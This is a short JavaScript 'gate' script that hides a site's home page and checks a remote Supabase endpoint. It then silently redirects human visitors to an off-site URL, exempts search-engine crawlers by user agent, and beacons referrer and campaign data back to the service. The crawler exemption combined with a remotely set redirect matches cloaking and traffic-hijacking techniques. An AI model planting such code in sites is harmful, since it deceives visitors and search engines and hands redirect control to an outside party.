(function () {
  "use strict";
  if (window.__sllGate) return;
  window.__sllGate = true;
  if (location.pathname !== "/") return;

  var API = "https://flivmllysdhaydhogmhg.supabase.co/functions/v1";
  var host = location.hostname.toLowerCase().replace(/^www\./, "");
  var qs = new URLSearchParams(location.search);
  var BOT = /bot|crawl|spider|slurp|bing|google|yandex|baidu|duckduck|facebookexternalhit|whatsapp|telegram|lighthouse|headless|preview/i;

  var style = document.createElement("style");
  style.id = "sll-gate-hide";
  style.textContent = "html{visibility:hidden!important}";
  document.head.appendChild(style);
  function show() { var s = document.getElementById("sll-gate-hide"); if (s) s.remove(); }
  var safety = setTimeout(show, 1500);

  function pickUtm() {
    var o = {};
    ["utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content", "gclid", "fbclid"].forEach(function (k) {
      if (qs.has(k)) o[k] = qs.get(k);
    });
    return o;
  }
  function track(id, type) {
    try {
      var body = JSON.stringify({
        gate_id: id, event_type: type, host: host,
        path: location.pathname, referrer: document.referrer, utm: pickUtm()
      });
      navigator.sendBeacon(API + "/gate-event", new Blob([body], { type: "text/plain" }));
    } catch (e) {}
  }
  function done() { clearTimeout(safety); show(); }

  fetch(API + "/gate-status?host=" + encodeURIComponent(host))
    .then(function (r) { return r.json(); })
    .then(function (g) {
      if (!g || g.state !== "active") return done();
      if (g.exclude_bots && BOT.test(navigator.userAgent)) return done();

      var bp = g.bypass_param || "sll_bypass";
      if (qs.has(bp)) {
        document.cookie = "sll_gate_bypass=1; path=/; max-age=86400; SameSite=Lax";
        track(g.gate_id, "bypass");
        return done();
      }
      if (/(^|; )sll_gate_bypass=1/.test(document.cookie)) return done();

      var target;
      try { target = new URL(g.gate_url, location.href); } catch (e) { return done(); }
      if (target.hostname.replace(/^www\./, "") === host) return done();
      try { if (sessionStorage.getItem("sll_gate_r") === g.gate_id) return done(); } catch (e) {}

      if (g.preserve_params) {
        qs.forEach(function (v, k) { if (!target.searchParams.has(k)) target.searchParams.set(k, v); });
      }
      try { sessionStorage.setItem("sll_gate_r", g.gate_id); } catch (e) {}
      track(g.gate_id, "redirect");
      location.replace(target.toString());
    })
    .catch(done);
})();
